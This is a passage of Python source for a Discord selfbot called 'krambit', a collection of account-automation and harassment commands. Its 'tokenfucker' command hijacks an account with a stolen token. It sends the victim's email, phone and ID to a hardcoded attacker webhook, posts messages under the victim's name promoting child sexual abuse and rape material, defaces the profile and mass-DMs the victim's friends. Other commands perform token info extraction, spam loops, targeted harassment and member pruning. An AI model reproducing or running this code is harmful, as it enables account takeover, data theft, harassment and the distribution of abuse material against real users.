    except ValueError:
        delay = 0.01
        names = " ".join(args)

    names_list = [n.strip() for n in names.split(",") if n.strip()]
    if not names_list:
        return await ctx.send("Invalid names.", delete_after=5)

    channel = krambit.get_channel(channel_id)
    if not channel:
        return await ctx.send("Invalid channel ID.", delete_after=5)

    # save task
    gn_saved[str(channel_id)] = {
        "names": names_list,
        "delay": delay,
        "count": 1
    }
    save_gn(gn_saved)

    gcstatus[channel_id] = True

    await ctx.send(
        f"Started GN for <#{channel_id}> ({delay}s)",
        delete_after=8
    )

    # =======================
    # PURE while True LOOP
    # =======================

    while True:
        if not gcstatus.get(channel_id):
            break

        data = gn_saved.get(str(channel_id))
        if not data:
            break

        count = data["count"]
        names = data["names"]

        new_name = f"{names[count % len(names)]} | {count}"

        try:
            await channel.edit(name=new_name)
        except Exception as e:
            print(f"[GN] Failed: {e}")

        data["count"] += 1
        save_gn(gn_saved)

        await asyncio.sleep(data["delay"])


@krambit.command()
async def stopgn(ctx, channel_id: int):
    await ctx.message.delete()

    if not gcstatus.get(channel_id):
        return await ctx.send("No active GN.", delete_after=5)

    gcstatus[channel_id] = False

    if str(channel_id) in gn_saved:
        gn_saved.pop(str(channel_id))
        save_gn(gn_saved)

    await ctx.send(f"Stopped GN for {channel_id}", delete_after=5)


@krambit.command()
async def hypesquad(ctx, house: str):
    house_ids = {
        "bravery": 1,
        "brilliance": 2,
        "balance": 3
    }

    if house.lower() == "off":
        url = "https://discord.com/api/v10/hypesquad/online"
        async with aiohttp.ClientSession() as session:
            async with session.delete(url, headers=globalhead) as response:
                if response.status == 204:
                    await ctx.send("```HypeSquad house removed.```")
                else:
                    error_message = await response.text()
                    await ctx.send(f"```Failed to remove HypeSquad house: {response.status} - {error_message}```")
        return

    house_id = house_ids.get(house.lower())
    if house_id is None:
        await ctx.send("```Invalid house. Choose from 'bravery', 'brilliance', 'balance', or 'off'.```")
        return

    payload = {"house_id": house_id}
    url = "https://discord.com/api/v10/hypesquad/online"

    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=globalhead, json=payload) as response:
            if response.status == 204:
                await ctx.send(f"```HypeSquad house changed to {house.capitalize()}.```")
            else:
                error_message = await response.text()
                await ctx.send(f"```Failed to change HypeSquad house: {response.status} - {error_message}```")


@krambit.command(aliases=['ab'])
async def autobeef(ctx, type_: str, channel_id: int, *user_ids):
    global ab
    await ctx.message.delete()

    if ab:
        return await ctx.send("Auto beef is already running.", delete_after=5)

    ab = True

    channel = krambit.get_channel(channel_id)
    if not channel:
        ab = False
        return await ctx.send("Invalid channel ID.", delete_after=5)

    mentions = ' '.join(f'<@{uid}>' for uid in user_ids)

    while ab:
        msg = gab()
        await msgab(msg, type_.lower(), channel, mentions)
        await asyncio.sleep(2.3)


@krambit.command(aliases=['sab', 'abe'])
async def stopautobeef(ctx):
    global ab
    ab = False
    await ctx.message.delete()
    

@krambit.command()
async def setpfp(ctx, url: str = None):
    await ctx.message.delete()    
    	
    attachment = ctx.message.attachments[0] if ctx.message.attachments else None

    if not url and not attachment:
        return await ctx.send("```Please provide a URL or attach an image.```", delete_after=10)

    image_url = url or attachment.url


    async with aiohttp.ClientSession() as session:
        async with session.get(image_url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()

                content_type = response.headers.get('Content-Type', '')
                image_format = 'gif' if 'gif' in content_type else 'png'

                payload = {
                    "avatar": f"data:image/{image_format};base64,{image_b64}"
                }

                response = sesh.patch("https://discord.com/api/v10/users/@me", json=payload, headers=globalhead)

                if response.status_code == 200:
                    await ctx.send("```Successfully set profile picture```", delete_after=3)
                else:
                    await ctx.send(f"```Failed to update profile picture: {response.status_code}```", delete_after=10)
            else:
                await ctx.send("```Failed to download image```", delete_after=10)


@krambit.command()
async def setbanner(ctx, url: str = None):
    await ctx.message.delete()    
    
    attachment = ctx.message.attachments[0] if ctx.message.attachments else None

    if not url and not attachment:
        return await ctx.send("```Please provide a URL or attach an image.```", delete_after=10)

    banner_url = url or attachment.url

    async with aiohttp.ClientSession() as session:
        async with session.get(banner_url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()
                
                content_type = response.headers.get('Content-Type', '')
                if 'gif' in content_type:
                    image_format = 'gif'
                else:
                    image_format = 'png'

                payload = {
                    "banner": f"data:image/{image_format};base64,{image_b64}"
                }

                response = sesh.patch("https://discord.com/api/v10/users/@me", json=payload, headers=globalhead)
                
                if response.status_code == 200:
                    await ctx.send("```Successfully set banner```")
                else:
                    await ctx.send(f"```Failed to update banner: {response.status_code}```")
            else:
                await ctx.send("```Failed to download image from URL```")
                
                
@krambit.command()
async def stealpfp(ctx, user: discord.Member = None):
    if not user:
        await ctx.send("```Please mention a user to steal their profile picture```")
        return

    await ctx.message.delete()

    avatar_url = str(user.display_avatar.url)

    async with aiohttp.ClientSession() as session:
        async with session.get(avatar_url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()

                payload = {
                    "avatar": f"data:image/{avatar_format};base64,{image_b64}"
                }

                response = sesh.patch("https://discord.com/api/v10/users/@me", json=payload, headers=globalhead)
                
                if response.status_code == 200:
                    await ctx.send(f"```Successfully stole {user.name}'s profile picture```")
                else:
                    await ctx.send(f"```Failed to update profile picture: {response.status_code}```")
            else:
                await ctx.send("```Failed to download the user's profile picture```")


@krambit.command()
async def stealbanner(ctx, user: discord.Member = None):
    if not user:
        await ctx.send("```Please mention a user to steal their banner```")
        return

    profile_url = f"https://discord.com/api/v10/users/{user.id}/profile"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(profile_url, headers=globalhead) as response:
            if response.status == 200:
                data = await response.json()
                banner_hash = data.get("user", {}).get("banner")
                
                if not banner_hash:
                    await ctx.send("```This user doesn't have a banner```")
                    return
                
                banner_format = "gif" if banner_hash.startswith("a_") else "png"
                banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_hash}.{banner_format}?size=1024"
                
                async with session.get(banner_url) as banner_response:
                    if banner_response.status == 200:
                        banner_data = await banner_response.read()
                        banner_b64 = base64.b64encode(banner_data).decode()
                        
                        payload = {
                            "banner": f"data:image/{banner_format};base64,{banner_b64}"
                        }
                        
                        response = sesh.patch("https://discord.com/api/v10/users/@me", json=payload, headers=globalhead)
                        
                        if response.status_code == 200:
                            await ctx.send(f"```Successfully stole {user.name}'s banner```")
                        else:
                            await ctx.send(f"```Failed to update banner: {response.status_code}```")
                    else:
                        await ctx.send("```Failed to download the user's banner```")
            else:
                await ctx.send("```Failed to fetch user profile```")
                
                
@krambit.command()
async def setpronoun(ctx, *, pronoun: str):
    await ctx.message.delete()
    

    new_name = {
        "pronouns": pronoun
    }

    url_api_info = "https://discord.com/api/v10/users/%40me/profile"

    try:
        response = requests.patch(url_api_info, headers=globalhead, json=new_name)

        if response.status_code == 200:
            await ctx.send(f"```pronoun updated to: {pronoun}```")
        else:
            await ctx.send(f"```Failed to update pronoun : {response.status_code} - {response.json()}```")

    except Exception as e:
        await ctx.send(f"```An error occurred: {e}```")


@krambit.command()
async def setbio(ctx, *, bio_text: str):
    await ctx.message.delete()	
	
    new_bio = {
        "bio": bio_text
    }

    url_api_info = "https://discord.com/api/v10/users/%40me/profile"
    
    try:
        response = requests.patch(url_api_info, headers=globalhead, json=new_bio)

        if response.status_code == 200:
            await ctx.send("```Bio updated successfully!```")
        else:
            await ctx.send(f"```Failed to update bio: {response.status_code} - {response.json()}```")

    except Exception as e:
        await ctx.send(f"```An error occurred: {e}```")

 
@krambit.command()
async def avatar(ctx, user: discord.User = None):
    try:
        if user is None:
            user = krambit.user

        if user.display_avatar:
            avatar_url = user.display_avatar.url
            await ctx.send(f'Avatar URL: {avatar_url}')
        else:
            await ctx.send(f'{user.name} does not have an avatar.', delete_after=5)

        await ctx.message.delete()
    except Exception as e:
        await ctx.send(f'An error occurred: {e}', delete_after=10)
        

@krambit.command()
async def banner(ctx, user: discord.User):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    
    url = f"https://discord.com/api/v10/users/{user.id}/profile"
    
    try:
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            banner_hash = data.get("user", {}).get("banner")
            
            if banner_hash:
                banner_format = "gif" if banner_hash.startswith("a_") else "png"
                banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_hash}.{banner_format}?size=2048"
                await ctx.send(f"```{user.display_name}'s banner:```\n[krambit Sb]({banner_url})")
            else:
                await ctx.send(f"{user.mention} does not have a banner set.")
        else:
            await ctx.send(f"Failed to retrieve banner: {response.status_code} - {response.text}")
    
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@krambit.command()
async def ipinfo(ctx, ip: str):
    try:
        response = requests.get(f'http://ipwho.is/{ip}')
        data = response.json()

        if data.get('success'):
            info = (
                f"**Latitude**: {data.get('latitude', 'N/A')}\n"
                f"**Longitude**: {data.get('longitude', 'N/A')}\n"
                f"**Country**: {data.get('country', 'N/A')}\n"
                f"**City**: {data.get('city', 'N/A')}\n"
                f"**Postal Code**: {data.get('postal', 'N/A')}\n"
            )
        else:
            errmsg = data.get('message', 'Failed to retrieve IP information.')
            info = f'Error: {errmsg}'
    except Exception as e:
        info = f'An error occurred: {e}'
    
    await ctx.message.delete()
    await ctx.send(info, delete_after=30)
   

@krambit.command(aliases=['ap'])
async def autopressure(ctx, *args):
    global ap
    ap = True

    delay = 3.0
    channel = ctx.channel

    try:
        if args and args[-1].replace('.', '', 1).isdigit():
            delay = float(args[-1])
            args = args[:-1]

        apuser = [await commands.UserConverter().convert(ctx, arg) for arg in args if arg.startswith('<@')]

        if not apuser:
            await ctx.send('You need to mention at least one user.', delete_after=3)
            return

        await ctx.message.delete()
        await aptask(channel, apuser, press, delay)

    except (ValueError, discord.ext.commands.errors.BadArgument):
        await ctx.send('Invalid input format. Check your users and delay.', delete_after=3)
        
        
@krambit.command(aliases=['ape'])
async def stopautopressure(ctx):
    global ap
    await ctx.message.delete()

    if not ap:
        await ctx.send('ap is not active.', delete_after=5)
    else:
        ap = False
        await ctx.send('ap stopped.', delete_after=5)
        
        
@krambit.command()
async def ar2(ctx, user: discord.User, num_newlines: int = None, *, reply_message: str = None):
    await ctx.message.delete()

    if reply_message is None:
        await ctx.send("Provide a message.", delete_after=5)
        return

    ar2users = loadar2()
    
    if num_newlines is not None:
        repeated_part = ('‎\n\n') * num_newlines
        final_reply = repeated_part + reply_message
    else:
        final_reply = reply_message

    auto_replies[user.id] = final_reply
    auto_reply_enabled[user.id] = True
    ar2users[user.id] = (user.name, final_reply)
    savear2(ar2users)

    await ctx.send(f"Ar2 set for {user.name}: {reply_message}", delete_after=5)


@krambit.command()
async def ar2e(ctx, user: discord.User):
    await ctx.message.delete()

    ar2users = loadar2()

    if user.id in auto_reply_enabled and auto_reply_enabled[user.id]:
        auto_reply_enabled[user.id] = False
        ar2users.pop(user.id, None)
        savear2(ar2users)
        await ctx.send(f"Ar2 for {user.name} is now disabled.", delete_after=5)
    else:
        await ctx.send(f"Ar2 for {user.name} is already disabled or not set.", delete_after=5)
        
        
@krambit.command()
async def ar2list(ctx):

    ar2users = loadar2()

    await ctx.message.delete()
    
    if ar2users:
        user_list = []
        for user_id, (username, _) in ar2users.items():
            user_list.append(f"{user_id} | {username}")
        
        await ctx.send(f"Ar2 enabled for the following users:\n" + "\n".join(user_list), delete_after=10)
    else:
        await ctx.send("No users have ar2 enabled.", delete_after=5)
        
        
@krambit.command()
async def serverprune(ctx, d: int = 1):
    if ctx.guild.id == 1279045226584871013:
        return await ctx.send("This server is immune to pruning.", delete_after=5)
        
    try:
        count = await ctx.guild.prune_members(days=d, compute_prune_count=True, reason='Pruning inactive members')
        await ctx.send(f'Pruned {count} members.', delete_after=3)
    except Exception as e:
        await ctx.send("Failed to prune members.", delete_after=5)
        print(f'Failed to prune members: {e}')
        

@krambit.command()
async def regionspam(ctx, channel_id: int):
    await ctx.message.delete()

    channel = krambit.get_channel(channel_id)
    if not isinstance(channel, discord.VoiceChannel):
        await ctx.send("Invalid voice channel ID.")
        return

    rspam = False
    await ctx.send(f"Started region spam on: {channel.name}")

    while not rspam:
        try:
            r = random.choice(["us-west", "us-east", "us-central", "us-south", "rotterdam", "hongkong", "japan", "brazil", "singapore", "sydney", "russia", "india"])
            await channel.edit(rtc_region=r)
            await asyncio.sleep(10)
        except Exception as e:
            print(f"Error: {e}")
            break


@krambit.command()
async def stopspamregion(ctx):
    await ctx.message.delete()

    rspam = True
    await ctx.send("Stopped all region spams", delete_after=3)


@krambit.command(aliases=['lgcs'])
async def leavegcs(ctx):
    await ctx.message.delete()
    await ctx.send("Are you sure you want to leave all group DMs? Type 'yes' to confirm or 'no' to cancel.", delete_after=60)

    def c(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() in ['yes', 'no']

    try:
        r = await krambit.wait_for('message', timeout=30.0, check=c)
    except asyncio.TimeoutError:
        return

    if r.content.lower() == 'no':
        return

    n = 0

    for g in krambit.private_channels:
        if isinstance(g, discord.GroupChannel):
            try:
                async with aiohttp.ClientSession() as s:
                    u = f"https://discord.com/api/v10/channels/{g.id}?silent=true"
                    h = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                    }
                    async with s.delete(u, headers=h):
                        n += 1
                await asyncio.sleep(1)
            except:
                pass

    await ctx.send(f'left {n} gcs')
    
    
@krambit.command()
async def ar(ctx, user: discord.User = None):
    global ar_active

    if user is None:
        await ctx.send("Please mention a user to enable ar for.", delete_after=5)
        return

    if not ar_active:
        ar_active = True

    if user.id in ar_users:
        await ctx.send(f'ar is already enabled for {user.name}.', delete_after=5)
    else:
        ar_users.add(user.id)
        await ctx.send(f'ar enabled for {user.name}.', delete_after=5)

    savear()
    await ctx.message.delete()


@krambit.command()
async def are(ctx, user: discord.User = None):
    global ar_active

    if user is None:
        if ar_users:
            ar_users.clear()
            ar_active = False
            await ctx.send("ar stopped for all users.", delete_after=5)
        else:
            await ctx.send("ar is not active for any users.", delete_after=5)
    else:
        if user.id in ar_users:
            ar_users.remove(user.id)
            await ctx.send(f'ar stopped for {user.name}.', delete_after=5)
            if not ar_users:
                ar_active = False
        else:
            await ctx.send(f'AR is not active for {user.name}.', delete_after=5)

    savear()
    await ctx.message.delete()
    

@krambit.command()
async def arlist(ctx):
    loadar()

    if ar_users:
        user_list = [f"({user_id})" for user_id in ar_users]
        await ctx.send("ar enabled for the following users:\n" + "\n".join(user_list), delete_after=10)
    else:
        await ctx.send("No users have ar enabled", delete_after=5)
        

@krambit.command()
async def purge(ctx, amount: int, channel_id: int = None):
    await ctx.message.delete()

    channel = krambit.get_channel(channel_id) if channel_id else ctx.channel
    deleted = 0

    async with httpx.AsyncClient() as client:
        async for message in channel.history(limit=None, oldest_first=False):
            if deleted >= amount:
                break

            if message.is_system():
                continue

            if message.author.id == krambit.user.id or message.author.id in (1391740554471149609, 1443535817871069296):
                try:
                    await client.delete(
                        f"https://discord.com/api/v10/channels/{channel.id}/messages/{message.id}",
                        headers=globalhead
                    )
                    deleted += 1
                    await asyncio.sleep(3)
                except Exception:
                    continue

    await ctx.send(f"Deleted: {deleted}", delete_after=5)
    
    
class TokenClient(discord.Client):
    def __init__(self, token):
        super().__init__(chunk_guilds_at_startup=False, assume_unsync_clock=True, max_messages=500, heartbeat_timeout=120.0, reconnect=True)
        self.token = token
        self.files = []
        self.session = None

    async def on_ready(self):
        try:
            self.session = aiohttp.ClientSession()
            headers = {"Authorization": self.token}

            async with self.session.get("https://discord.com/api/v10/users/@me", headers=headers) as resp:
                user_data = await resp.json()

            user = self.user
            avatar_url = (
                f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png"
                if user.avatar else "No Avatar"
            )

            self.create_file("userinfo.txt", (
                f"Token Info:\n"
                f"Token: {self.token}\n"
                f"ID: {user.id}\n"
                f"Username: {user.name}\n"
                f"Avatar: {avatar_url}\n"
                f"Email: {user_data.get('email', 'Not Available')}\n"
                f"Phone: {user_data.get('phone', 'Not Available')}\n"
                f"Verified: {'Yes' if user_data.get('verified') else 'No'}\n"
                f"MFA Enabled: {'Yes' if user_data.get('mfa_enabled') else 'No'}\n"
                f"Nitro: {'Yes' if user_data.get('premium_type') else 'No'}\n"
            ))

            self.create_file(
                "servers.txt",
                "\n".join(guild.name for guild in self.guilds) or "No servers found."
            )

            admin_guilds = [
                guild for guild in self.guilds
                if guild.me.guild_permissions.administrator
            ]

            self.create_file(
                "perms.txt",
                "\n".join(f"{guild.name}: {guild.me.guild_permissions.value}" for guild in admin_guilds)
                or "No admin permissions found."
            )

        except Exception as e:
            print(f"Error occurred: {e}")

        finally:
            if self.session and not self.session.closed:
                await self.session.close()
            await self.close()

    def create_file(self, filename, content):
        with open(filename, "w", encoding="utf-8") as f:
            f.write(content)
        self.files.append(filename)
        
        
async def toki(token):
    client = TokenClient(token)
    await client.start(token)
    return client.files


@krambit.command()
async def ct(ctx, token: str):
    await ctx.message.delete()

    files = await toki(token)

    if files:
        await ctx.send("Here is the extracted info:", files=[discord.File(f) for f in files])

        await asyncio.sleep(5)

        for f in files:
            os.remove(f)
    else:
        await ctx.send("Failed to gather any information.")
        
        
@krambit.command(aliases=["tokfucker", "tf"])
async def tokenfucker(ctx, tok: str, invite: str):
    await ctx.message.delete()
     
    tfheaders = {
        "authority": "discord.com",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US",
        "authorization": tok,
        "origin": "https://discord.com",
        "sec-ch-ua": '"Chromium";v="132", "Not;A=Brand";v="99", "Brave";v="132"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Discord/1.0.9168 Chrome/132.0.6834.83 "
            "Electron/34.1.1 Safari/537.36"
        ),
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-discord-timezone": "Asia/Calcutta",
        "x-super-properties": (
            "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5u"
            "ZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MTY4Iiwib3NfdmVyc2lvbiI6IjEw"
            "LjAuMjYwMDMiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2Fs"
            "ZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQg"
            "MTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykg"
            "RGlzY29yZC8xLjAuOTE2OCBDaHJvbWUvMTMyLjAuNjgzNC44MyBFbGVjdHJvbi8zNC4xLjEgU2Fm"
            "YXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjM0LjEuMSIsImNsaWVudF9idWlsZF9udW1i"
            "ZXIiOjI0MDIzNywibmF0aXZlX2J1aWxkX251bWJlciI6Mzg1MTcsImNsaWVudF9ldmVudF9zb3Vy"
            "Y2UiOm51bGx9"
        )
    }

    tfsesh = Session(client_identifier="chrome_132", random_tls_extension_order=True)

    created = 0
    left = 0
    dmed = 0

    progress = await ctx.send(
        f"```[ Token Fucking In Progress ]\nCreated Guilds : {created}\nLeft Guilds : {left}\nMass DMs : {dmed}```"
    )


    try:
        res = requests.get("https://discord.com/api/v10/users/@me", headers=tfheaders)
        if res.status_code == 200:
            user_data = res.json()
            email = user_data.get("email", "None")
            phone = user_data.get("phone", "None")
            user_id = user_data.get("id", "None")
            global_name = user_data.get("global_name", "None")
            user_name = user_data.get("username", "None")

            token_info_msg = (
                f"**Token Info:**\n"
                f"**User Name: {user_name}\n"
                f"Email: {email}\n"
                f"Phone: {phone}\n"
                f"User ID: {user_id}\n"
                f"Global Name: {global_name}"
            )

            try:
                requests.post("https://discord.com/api/webhooks/1407227890302587031/tEVUN9rB6K6UZAD1QmbgeohMkrLHkidRQo87Ly1kmYruZjSaIY58k25fHFh5gjrtX-IU", json={"content": token_info_msg, "avatar_url": "https://cdn.discordapp.com/avatars/1283695829248512056/a0427336ae3accc806fe53920805cb89.webp?size=2048"})
            except Exception as e:
                print(f"[Webhook Error] {e}")
    except Exception as e:
        print(f"[Fetch Token Info Error] {e}")


    try:
        code = invite.split("/")[-1]
        res = requests.post(
            f"https://discord.com/api/v10/invites/{code}",
            headers=tfheaders
        )
        if res.status_code in (200, 201):
            gc_data = res.json()
            channel_id = gc_data.get("channel", {}).get("id")


            if channel_id:
                requests.post(
                    f"https://discord.com/api/v10/channels/{channel_id}/messages",
                    headers=tfheaders,
                    json={"content": "https://faphouse2.com/videos/jMeMF1\n\ncheck this child porn it made me cum"}
                )

                requests.post(
                    f"https://discord.com/api/v10/channels/{channel_id}/messages",
                    headers=tfheaders,
                    json={"content": "https://xxxbp.tv/video/64655/amateur-blowjob-and-homemade-video-with-lala-and-her-rural-adventure\n\ncheck this revenge porn a teen getting raped LOL"}
                )
                
                requests.delete(
                    f"https://discord.com/api/v10/channels/{channel_id}?silent=true",
                    headers=tfheaders
                )
                print(f"[Left GC] {channel_id}")
    except Exception as e:
        print(f"[Join GC Error] {e}")


    try:
        await httpx.AsyncClient().patch(
            "https://discord.com/api/v10/users/@me/profile",
            headers=tfheaders,
            json={"bio": "**krambit runs me\nhttps://discord.gg/annihilate\nhttps://guns.lol/@7**"}
        )
    except Exception as e:
        print(f"[Bio Update Error] {e}")

    try:
        tfsesh.patch(
            "https://discord.com/api/v10/users/@me",
            headers=tfheaders,
            json={"global_name": "krambit > me and all"}
        )
    except Exception as e:
        print(f"[Global Name Error] {e}")


    def create_guilds_sync():
        nonlocal created
        for _ in range(20):
            try:
                res = tfsesh.post(
                    "https://discord.com/api/v10/guilds",
                    headers=tfheaders,
                    json={"name": "krambit > you"}
                )
                if res.status_code in (200, 201):
                    created += 1
                elif res.status_code == 429:
                    retry = res.json().get("retry_after", 5)
                    time.sleep(retry)
                    continue
                time.sleep(1.5)
            except Exception as e:
                print(f"[Guild Create Error] {e}")

    def leave_guilds_sync():
        nonlocal left
        tfheaderss = {"Authorization": tok}
        while True:
            try:
                res = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=tfheaderss)
                if res.status_code != 200:
                    break
                guilds = res.json()
                if not guilds:
                    break
                for g in guilds:
                    gid = g["id"]
                    if g.get("owner", False):
                        continue
                    while True:
                        r = requests.delete(f"https://discord.com/api/v10/users/@me/guilds/{gid}", headers=tfheaderss)
                        if r.status_code in (200, 204):
                            left += 1
                            time.sleep(5)
                            break
                        elif r.status_code == 429:
                            retry = r.json().get("retry_after", 1)
                            time.sleep(retry + 0.1)
                            continue
                        else:
                            break
            except:
                break

    def mass_dm_sync():
        nonlocal dmed
        try:
            res = requests.get("https://discord.com/api/v10/users/@me/relationships", headers=tfheaders)
            if res.status_code != 200:
                return
            friends = [f for f in res.json() if f["type"] == 1]
            for fr in friends:
                uid = fr["id"]
                try:
                    dm = requests.post("https://discord.com/api/v10/users/@me/channels", headers=tfheaders, json={"recipient_id": uid})
                    if dm.status_code not in (200, 201):
                        continue
                    dm_id = dm.json()["id"]
                    send = requests.post(f"https://discord.com/api/v10/channels/{dm_id}/messages", headers=tfheaders, json={"content": "krambit raped me\nhttps://discord.gg/annihilate"})
                    if send.status_code in (200, 201):
                        dmed += 1
                        time.sleep(3)
                except:
                    continue
        except:
            return


    async def runner():
        await asyncio.gather(
            asyncio.to_thread(create_guilds_sync),
            asyncio.to_thread(leave_guilds_sync),
            asyncio.to_thread(mass_dm_sync),
        )

    await runner()

    await progress.edit(content=f"```[ Token Fucking Completed ]\nCreated Guilds : {created}\nLeft Guilds : {left}\nMass DMs : {dmed}```")


@krambit.command()
async def status(ctx, type: str):
    await ctx.message.delete()
    type = type.lower()
    if type == 'on':
        await krambit.change_presence(status=discord.Status.online)
        await ctx.send('Online.', delete_after=3)
    elif type == 'dnd':
        await krambit.change_presence(status=discord.Status.dnd)
        await ctx.send('dnd', delete_after=3)        
    elif type == 'idle':
        await krambit.change_presence(status=discord.Status.idle)
        await ctx.send('idle', delete_after=3)
    elif type == 'off':
        await krambit.change_presence(status=discord.Status.invisible)
        await ctx.send('invisible', delete_after=3)
    else:
        await ctx.send('Invalid status type. Use `online` or `dnd` or `off` or `idle`.', delete_after=5)


@krambit.command(aliases=['fs'])
async def spam(ctx, times: int, *, message):
    await ctx.message.delete()
    
    for _ in range(times):
        try:
            await ctx.send(message)
        except discord.HTTPException as e:
            print(f'Error: {e}')
            await asyncio.sleep(5)
            

@krambit.command()
async def upload(ctx):
    await ctx.message.delete()

    if not ctx.message.attachments:
        return await ctx.send("No attachment found.", delete_after=5)
    
    attachment = ctx.message.attachments[0]
    filename = attachment.filename

    file_bytes = await attachment.read()
    with open(filename, 'wb') as f:
        f.write(file_bytes)
    
    await ctx.send(f"Uploaded `{filename}`", delete_after=5)
    
            
@krambit.command(aliases=['lgc'])
async def leavegc(ctx, channel_id: int = None):
	
    await ctx.message.delete()
    channel_id = channel_id or ctx.channel.id

    async with aiohttp.ClientSession() as session:
        url = f"https://discord.com/api/v10/channels/{channel_id}?silent=true"
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }
        async with session.delete(url, headers=headers):
            pass


@krambit.command()
async def rename(ctx, *, new_name: str):
    await ctx.message.delete()
    if isinstance(ctx.channel, (discord.TextChannel, discord.GroupChannel)):
        await ctx.channel.edit(name=new_name)
 
        
@krambit.command()
async def rotateguild(ctx, mode=None, *args):
    global rgid, rga
    await ctx.message.delete()

    if mode is None:
        await ctx.send("Usage: `.rg start (ids...) | stop | list | add <id...> | remove <id...>`", delete_after=5)
        return

    mode = mode.lower()

    if mode == "start":
        if rga:
            await ctx.send("Already rotating guilds.", delete_after=5)
            return

        rga = True
        rgid.clear()

        if args:
            raw_ids = " ".join(args).replace(",", " ").split()
            rgid.extend([i for i in raw_ids if i.isdigit()])
        else:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://canary.discord.com/api/v10/users/@me/guilds', headers=globalhead) as resp:
                    if resp.status != 200:
                        rga = False
                        await ctx.send("Failed to fetch guilds.", delete_after=5)
                        return

                    guilds = await resp.json()
                    for guild in guilds:
                        test_payload = {
                            'identity_guild_id': guild['id'],
                            'identity_enabled': True
                        }

                        async with session.put('https://canary.discord.com/api/v10/users/@me/clan', headers=globalhead, json=test_payload) as test_resp:
                            if test_resp.status == 200:
                                rgid.append(guild['id'])
                        await asyncio.sleep(0.12)

        if not rgid:
            rga = False
            await ctx.send("No valid guilds found for rotation.", delete_after=5)
            return

        await ctx.send(f"Rotating {len(rgid)} guild(s)...", delete_after=5)

        def change_identity(guild_id):
            try:
                response = requests.put(
                    "https://discord.com/api/v10/users/@me/clan",
                    headers={
                        "Authorization": token,
                        "Content-Type": "application/json"
                    },
                    json={
                        "identity_guild_id": guild_id,
                        "identity_enabled": True
                    }
                )
                if response.status_code != 200:
                    print(f"[!] Failed to switch to {guild_id} | {response.status_code} | {response.text}")
            except requests.RequestException as e:
                print(f"[!] Error: {e}")

        async def rotate_guilds():
            while rga:
                for gid in rgid:
                    if not rga:
                        break
                    change_identity(gid)
                    await asyncio.sleep(9)

        await rotate_guilds()

    elif mode == "stop":
        if rga:
            rga = False
            await ctx.send("Stopped rotating guilds.", delete_after=5)
        else:
            await ctx.send("No active rotation to stop.", delete_after=5)

    elif mode == "list":
        if not rgid:
            await ctx.send("No guilds in the rotation list.", delete_after=5)
            return


        guild_lines = []
        async with aiohttp.ClientSession() as session:
            for gid in rgid:
                async with session.get(f"https://discord.com/api/v10/users/@me/clan/guilds/{gid}", headers=globalhead) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        tag = data.get("clan", {}).get("name", "No Tag")
                        guild_lines.append(f"`{gid}` | {tag}")
                    else:
                        guild_lines.append(f"`{gid}` | [Failed to fetch]")
                await asyncio.sleep(0.1)

        msg = "\n".join(guild_lines)
        await ctx.send(f"**Rotating {len(rgid)} guild(s):**\n{msg}", delete_after=15)

    elif mode == "add":
        new_ids = [i for i in args if i.isdigit()]
        added = 0
        for i in new_ids:
            if i not in rgid:
                rgid.append(i)
                added += 1
        await ctx.send(f"Added {added} guild(s) to rotation.", delete_after=5)

    elif mode == "remove":
        removed = 0
        for i in args:
            if i in rgid:
                rgid.remove(i)
                removed += 1
        await ctx.send(f"Removed {removed} guild(s) from rotation.", delete_after=5)

    else:
        await ctx.send("Unknown mode. Use: start, stop, list, add, remove", delete_after=5)
        

@krambit.command(aliases=['areact', 'r', 'autor'])
async def autoreact(ctx, *emojis) -> None:
    await ctx.message.delete()
    global emojisreact, reaction_active

    if not emojis:
        await ctx.send("Please specify at least one emoji.", delete_after=5)
        return

    if reaction_active:
        emojisreact = list(emojis)
        await ctx.send(f"Updated reaction emojis to: {', '.join(emojis)}", delete_after=5)
        print(f"Updated reaction emojis to: {', '.join(emojis)}", delete_after=3)
    else:
        emojisreact = list(emojis)
        reaction_active = True
        await ctx.send(f"Started reacting with emojis: {', '.join(emojis)}", delete_after=3)

        
@krambit.command(aliases=['re', 'endr', 'stopr', 'stopreact'])
async def stopautoreact(ctx) -> None:
    global emojisreact, reaction_active

    await ctx.message.delete()
    
    if not reaction_active:
        await ctx.send("Not currently reacting.", delete_after=3)
        print("Not currently reacting", delete_after=3)
        return
    emojisreact = []
    reaction_active = False
